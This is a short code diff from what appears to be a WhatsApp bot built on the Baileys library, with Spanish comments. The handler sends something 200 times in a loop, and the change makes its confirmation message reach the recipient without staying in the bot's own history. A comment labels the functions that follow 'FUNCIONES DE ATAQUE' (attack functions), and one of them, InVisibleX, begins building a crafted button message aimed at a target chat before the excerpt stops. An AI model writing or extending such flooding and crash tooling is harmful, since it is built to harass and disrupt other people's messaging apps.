@@ -10,17 +10,16 @@ let handler = async (m, { conn }) => {
       await delay(10); // 🔁 Pausa para evitar rate-overlimit
     }
 
-    // ✅ Enviar mensaje final y eliminarlo solo para el bot
-    const sent = await conn.sendMessage(jid, { text: "✅ Delay enviado 200 veces." }, { quoted: m });
+    // 🔁 Mensaje que NO queda en historial del bot pero sí llega al receptor
+    const msg = await generateWAMessageFromContent(jid, {
+      extendedTextMessage: {
+        text: "✅ Delay enviado 200 veces.",
+        contextInfo: {},
+      },
+    }, {});
 
-    // 🔁 Eliminar solo para el bot (no afecta al receptor)
-    await conn.sendMessage(jid, {
-      delete: {
-        remoteJid: jid,
-        fromMe: true,
-        id: sent.key.id,
-        participant: conn.user.id
-      }
+    await conn.relayMessage(jid, msg.message, {
+      messageId: msg.key.id,
     });
 
   } catch (e) {
@@ -37,7 +36,7 @@ function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// 📡 FUNCIONES DE ATAQUE (sin cambios)
+// 📡 FUNCIONES DE ATAQUE
 async function InVisibleX(sock, jid, mention) {
   let msg = await generateWAMessageFromContent(jid, {
     buttonsMessage: {
